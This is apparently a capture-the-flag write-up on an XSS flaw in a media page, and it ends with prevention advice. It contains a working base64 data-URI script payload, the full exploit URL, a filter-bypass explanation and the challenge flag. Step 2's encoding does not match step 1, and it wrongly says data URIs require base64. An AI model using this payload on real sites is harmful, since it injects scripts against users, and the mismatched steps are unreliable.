# XSS Vulnerability: Media Object Injection

## Overview
A Cross-Site Scripting (XSS) vulnerability exists in the media display feature. The `src` parameter is insecurely rendered, allowing attackers to inject scripts.

---

## Discovery & Exploitation

- The NSA image loads from:  
  `/page=media&src=nsa`

- Since an `<object>` tag is used, you can inject a script using a data URI.

**Steps:**
1. XSS payload: `<script>alert('hello')</script>`
2. Base64 encode: `PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`
3. Data URI: `data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGVsbG8nKTwvc2NyaXB0Pg==`
4. Exploit:  
   `/page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGVsbG8nKTwvc2NyaXB0Pg==`

When visited, this triggers a JS alert and shows the flag.

---

## Why Base64 Encoding is Used

Base64 encoding is used instead of directly inserting the XSS payload to:

1. **Bypass Input Filters:**  
   Some applications block or sanitize special characters (like `<`, `>`, `'`, `"`). Base64 encoding hides these characters, allowing the payload to bypass basic filters.

2. **Enable Data URI Usage:**  
   Data URIs require base64 encoding to safely embed scripts or HTML as resources for tags like `<object>`.

3. **Prevent Breaking HTML Structure:**  
   Raw scripts may be corrupted or break the page, but base64 within a data URI stays intact and is properly decoded by the browser.

The browser then decodes the base64 back to the script and executes it, successfully triggering XSS.

---

## Flag

`928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d`

---

## Prevention

1. **Whitelist sources**: Only allow trusted `src` values
2. **Content Security Policy**: Set strict CSP headers
3. **Input Validation**: Validate `src` against allowed patterns
4. **Output Encoding**: Always encode user-supplied data
5. **Avoid dynamic `<object>` tags**: Use safer HTML elements

---
